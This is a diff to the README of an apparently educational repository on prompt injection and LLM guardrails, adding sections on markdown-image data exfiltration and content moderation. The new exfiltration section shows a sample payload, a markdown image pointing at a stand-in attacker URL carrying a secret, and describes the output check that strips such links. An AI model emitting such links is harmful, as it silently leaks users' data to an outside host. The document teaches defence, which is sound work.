@@ -248,6 +248,31 @@ layer would you strengthen to close it?
 
 ---
 
+## Going further — two more guardrail layers
+
+The capstone defends the passphrase. Two more layers you'll need in a real app:
+
+### Data exfiltration via markdown images & links
+A leak doesn't need the secret *shown* to the user. If the model emits a markdown
+image `![](https://attacker/log?d=SECRET)`, a markdown-rendering client silently
+fetches that URL — handing the data to the attacker. The defense is an output check
+on the **channel**: detect markdown images/links to non-allowlisted domains and strip
+them, even when you can't see a secret in the URL (it may be encoded).
+```bash
+python examples/10_data_exfiltration.py
+```
+
+### Content moderation — a different guardrail than injection defense
+Injection defense stops the model being *hijacked*; **moderation** stops *harmful*
+content (hate, violence, sexual, self-harm) coming in or going out. They're
+independent layers — run moderation on both the user's input and the model's output,
+and prefer a dedicated moderation endpoint (OpenAI's is free) for the input gate.
+```bash
+python examples/11_content_moderation.py
+```
+
+---
+
 ## Where to go next
 
 You've built defense in depth from scratch. The production frontier:
@@ -320,6 +345,8 @@ examples/
   07_output_checks.py       ← catch the leak on the way out
   08_dual_llm.py            ← quarantine untrusted data from authority
   09_redteam_eval.py        ← attack-success-rate, before vs after
+  10_data_exfiltration.py   ← markdown image/link leaks; defend the channel on output
+  11_content_moderation.py  ← moderate harmful content (input + output) — a distinct layer
 ```
 
 ---
@@ -343,7 +370,7 @@ at the top, and run it directly.
 
 ## The series
 
-This is one of eight standalone, hands-on deep dives into building with LLM APIs.
+This is one of thirteen standalone, hands-on deep dives into building with LLM APIs — eight core, plus five bonus dives.
 Each one stands on its own — its own setup, examples, and capstone — and they all
 share the same house style: provider-agnostic, built from scratch (no
 frameworks), offline-first examples, and a real capstone. Do them in any order;
@@ -357,5 +384,13 @@ this sequence builds naturally:
 6. [Agents](https://github.com/Ailuue/agents-deep-dive) — give a model tools and a loop so it can act
 7. [Prompt Injection & Guardrails](https://github.com/Ailuue/prompt-injection-deep-dive) — attack and defend all of the above
 8. [Production](https://github.com/Ailuue/ai-in-production-deep-dive) — operate one app end to end: observability, cost, reliability, caching, guardrails, prompt versioning, eval gates
+
+**Bonus dives** — standalone, slotting in where they're most useful:
+
+- [Context Engineering](https://github.com/Ailuue/context-engineering-deep-dive) — manage what's in the window: memory, compaction, assembly
+- [Multimodal](https://github.com/Ailuue/multimodal-deep-dive) — images & audio, not just text
+- [Fine-tuning](https://github.com/Ailuue/fine-tuning-deep-dive) — teach a model new behavior by example
+- [MCP](https://github.com/Ailuue/mcp-deep-dive) — serve tools, data & prompts to any LLM over a standard protocol
+- [Local Models](https://github.com/Ailuue/local-models-deep-dive) — run open-weight models on your own machine
 
 **You are here: #7 — Prompt Injection & Guardrails.**
